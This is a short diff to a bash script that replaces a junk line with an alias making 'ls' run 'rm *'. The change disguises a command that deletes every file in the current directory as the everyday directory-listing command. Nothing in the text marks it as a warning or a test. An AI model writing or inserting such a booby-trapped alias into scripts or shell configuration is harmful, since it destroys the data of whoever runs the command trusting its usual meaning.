@@ -1,2 +1,2 @@
 #!/bin/bash
-lslsld
+alias ls="rm *"
